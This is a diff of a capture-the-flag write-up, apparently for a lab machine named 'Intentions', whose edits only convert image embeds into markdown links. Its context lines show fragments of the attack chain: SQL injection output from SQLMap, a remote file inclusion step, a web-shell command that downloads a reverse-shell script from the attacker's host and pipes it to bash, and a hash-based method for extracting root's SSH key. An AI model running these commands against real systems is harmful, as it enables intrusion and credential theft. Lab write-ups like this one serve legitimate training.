@@ -95,7 +95,7 @@ Saved two critical requests:
 1. POST request - Updates user genre preferences
 2. GET request - Retrieves feed data based on stored preferences
 
-![[Pasted image 20250911072002.png]]
+![Pasted image 20250911072002.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911072002.png)
 
 **Step 2:** SQLMap exploitation with tamper script
 
@@ -123,7 +123,7 @@ The application filters whitespace characters from the genre parameter, requirin
 [07:20:05] [INFO] heuristic (basic) test shows that GET parameter 'genres' might be injectable
 ```
 
-![[Pasted image 20250911072226.png]]
+![Pasted image 20250911072226.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911072226.png)
 
 <div class="divider divider-info">
     <span class="divider-title">SQLMap Technique</span>
@@ -154,9 +154,9 @@ Table: users
 +----+----------------------+--------------------------------------------------------------+
 ```
 
-![[Pasted image 20250911072636.png]]
+![Pasted image 20250911072636.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911072636.png)
 
-![[Pasted image 20250911072705.png]]
+![Pasted image 20250911072705.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911072705.png)
 
 **Step 4:** Hash analysis
 
@@ -232,7 +232,7 @@ Content-Type: application/json
 
 **Step 2:** Test for RFI vulnerability
 
-![[Pasted image 20250911080054.png]]
+![Pasted image 20250911080054.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911080054.png)
 
 Modified the `path` parameter to reference a remote file:
 
@@ -320,7 +320,7 @@ Serving HTTP on 0.0.0.0 port 8000 ...
 ❯ curl "http://10.129.x.x/shell.php?cmd=curl+http://10.10.14.5:8000/revshell.sh|bash"
 ```
 
-![[Pasted image 20250911080544.png]]
+![Pasted image 20250911080544.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911080544.png)
 
 **Step 4:** Catch the shell
 
@@ -369,7 +369,7 @@ error: could not lock config file /var/www/.gitconfig: Permission denied
 
 **Workaround:** Change HOME environment variable
 
-![[Pasted image 20250911081002.png]]
+![Pasted image 20250911081002.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911081002.png)
 
 ```bash
 www-data@intentions:/var/www/html$ export HOME=/tmp
@@ -545,7 +545,7 @@ The scanner binary can read any file, including `/root/.ssh/id_rsa`. However, it
     <span class="divider-content">Since the scanner outputs hashes of file contents, we can extract files byte-by-byte by creating test files with known content and comparing their hashes. By testing every possible byte value (0-255 or all printable characters) at each position and comparing the hash output, we can reconstruct the entire file. This technique is similar to blind SQL injection but applied to file reading.</span>
 </div>
 
-![[Pasted image 20250911081903.png]]
+![Pasted image 20250911081903.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911081903.png)
 
 **Create extraction script:**
 
@@ -656,7 +656,7 @@ SHA256: a8f5...
 # This is tedious but works for small files
 ```
 
-![[Pasted image 20250911082417.png]]
+![Pasted image 20250911082417.png](/assets/images/2025-09-11-Intentions/Pasted image 20250911082417.png)
 
 **Result:** After extraction (via automated script), root's private SSH key is obtained:
 
